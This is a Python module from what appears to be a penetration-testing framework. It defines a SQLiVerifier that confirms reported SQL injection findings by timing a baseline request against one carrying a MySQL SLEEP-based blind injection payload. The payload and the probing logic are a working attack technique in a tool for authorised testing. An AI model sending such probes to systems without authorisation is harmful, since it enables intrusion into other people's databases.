from __future__ import annotations

import time

import httpx

from venice_pt.contracts.findings import Finding, Verdict


class SQLiVerifier:
    async def verify(self, finding: Finding, client: httpx.AsyncClient | None = None) -> Verdict:
        """Independent re-production using timing differential oracle."""
        if not finding.endpoint:
            return Verdict(
                finding_id=finding.id,
                confirmed=False,
                method="sqli_timing_check",
                confidence_delta=-0.4,
                notes="Missing target endpoint for verification",
            )

        target_url = finding.endpoint
        param = finding.param or "id"

        # Baseline request
        async with httpx.AsyncClient(timeout=15.0) as http_client:
            cli = client or http_client
            try:
                t0 = time.perf_counter()
                await cli.get(target_url, params={param: "1"})
                baseline_t = time.perf_counter() - t0

                # Delayed injection test: e.g. sleep 3 seconds
                t1 = time.perf_counter()
                await cli.get(
                    target_url, params={param: "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- "}
                )
                injected_t = time.perf_counter() - t1

                # If delay is >= 2.5s over baseline, timing oracle confirms SQLi
                if injected_t >= (baseline_t + 2.5):
                    return Verdict(
                        finding_id=finding.id,
                        confirmed=True,
                        method="timing_differential_oracle",
                        confidence_delta=0.2,
                        evidence=[f"Baseline: {baseline_t:.2f}s, Delay: {injected_t:.2f}s"],
                        notes="Timing-based differential confirmed SQL execution",
                    )
            except Exception as e:
                return Verdict(
                    finding_id=finding.id,
                    confirmed=False,
                    method="sqli_timing_check",
                    confidence_delta=-0.4,
                    notes=f"Verification request failed: {e}",
                )

        return Verdict(
            finding_id=finding.id,
            confirmed=False,
            method="sqli_timing_check",
            confidence_delta=-0.4,
            notes="Timing differential not observed on independent re-probe",
        )
